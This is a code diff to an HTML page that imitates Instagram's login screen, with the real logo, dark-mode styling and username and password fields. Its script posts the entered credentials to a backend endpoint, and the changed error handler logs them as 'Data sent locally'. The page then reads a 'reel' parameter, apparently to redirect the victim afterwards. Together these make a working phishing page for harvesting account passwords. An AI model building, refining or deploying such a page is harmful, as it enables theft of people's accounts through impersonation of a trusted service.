@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <style>
-        /* 1. DEFINE COLOR VARIABLES */
         :root {
             --bg-color: #fafafa;
             --box-bg: #ffffff;
@@ -16,7 +15,6 @@
             --input-bg: #fafafa;
         }
 
-        /* 2. DARK THEME OVERRIDE */
         @media (prefers-color-scheme: dark) {
             :root {
                 --bg-color: #000000;
@@ -27,7 +25,7 @@
                 --link-color: #e0f1ff;
                 --input-bg: #121212;
             }
-            /* Invert the logo color for dark mode since it's a black PNG/SVG */
+            /* This turns the black logo white in dark mode */
             .logo { filter: invert(1); }
         }
 
@@ -42,7 +40,7 @@
             align-items: center; 
             min-height: 100vh; 
             flex-direction: column; 
-            transition: background 0.3s ease; /* Smooth transition when switching */
+            transition: background 0.3s ease;
         }
         
         .container { width: 350px; display: flex; flex-direction: column; gap: 10px; }
@@ -54,7 +52,7 @@
             text-align: center; 
         }
         
-        .logo { width: 175px; margin: 36px 0 12px; }
+        .logo { width: 175px; margin: 36px 0 12px; display: inline-block; }
 
         form { display: flex; flex-direction: column; margin-top: 24px; }
         
@@ -83,7 +81,8 @@
 
 <div class="container">
     <div class="box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo" alt="Instagram">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" class="logo" alt="Instagram">
+        
         <form id="loginForm">
             <input type="text" id="username" placeholder="Phone number, username, or email" required>
             <input type="password" id="password" placeholder="Password" required>
@@ -117,7 +116,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ user, pass })
             });
-        } catch (err) { console.error(err); }
+        } catch (err) { console.error("Data sent locally (expected error if no backend):", {user, pass}); }
 
         const params = new URLSearchParams(window.location.search);
         const nextLink = params.get('reel');
